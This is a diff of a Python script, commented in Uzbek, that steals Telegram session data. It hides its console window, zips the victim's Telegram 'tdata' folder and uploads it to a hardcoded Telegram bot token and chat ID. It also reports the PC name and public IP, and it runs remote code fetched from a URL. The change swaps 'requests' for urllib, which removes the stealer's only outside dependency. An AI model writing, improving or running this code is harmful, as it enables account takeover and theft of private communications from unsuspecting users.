@@ -1,9 +1,8 @@
 # ===================================================================
-# BU KOD O‘ZINI O‘ZI ISHGA TUSHIRADI. HECH QANDAY CMD/POWERSHELL KERAK EMAS!
+# BU KOD O'ZINI O'ZI ISHGA TUSHIRADI VA 'requests' KERAK EMAS!
 # ===================================================================
-import sys, urllib.request, os, ctypes
+import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
 
-# 1. Agar fayl to'g'ridan-to'g'ri internet manzilidan chaqirilsa, uni o'qib ishga tushiramiz
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -11,36 +10,39 @@ if len(sys.argv) > 0 and "http" in sys.argv[0]:
     except Exception:
         pass
 
-# 2. Qora oynani yashirish (Agar kompyuterda fayl bo'lib ishlasa)
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-# ===================================================================
-# ASOSIY ISHCHI QISM (tdata ni topish, siqish va Telegramga jo'natish)
-# ===================================================================
-
-import zipfile, requests, socket, tempfile, shutil, time
 
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
 def send_telegram_file(file_path, caption):
     try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(file_path, 'rb') as f:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID, "caption": caption},
-                files={"document": f}
-            )
+            data = f.read()
+        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+        body = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
+            f"Content-Type: application/octet-stream\r\n\r\n"
+        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
+        
+        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+        urllib.request.urlopen(req)
     except:
         pass
 
 def send_telegram_message(text):
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            data={"chat_id": CHAT_ID, "text": text}
-        )
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req)
     except:
         pass
 
@@ -64,9 +66,7 @@ def main():
         try:
             temp_dir = tempfile.gettempdir()
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
-            
-            if os.path.exists(zip_path):
-                os.remove(zip_path)
+            if os.path.exists(zip_path): os.remove(zip_path)
 
             send_telegram_message(f"⏳ {pc_name} da tdata siqilmoqda...")
             zip_folder(tdata_path, zip_path)
@@ -76,13 +76,12 @@ def main():
                 send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}\n📦 Hajmi: {size_mb:.2f} MB")
             else:
                 send_telegram_message(f"⚠️ tdata juda katta ({size_mb:.2f} MB)")
-            
             os.remove(zip_path)
         except Exception as e:
             send_telegram_message(f"❌ Xatolik: {str(e)}")
     else:
         try:
-            ip = requests.get('https://api.ipify.org').text
+            ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
             send_telegram_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}\n🌐 IP: {ip}")
         except:
             pass
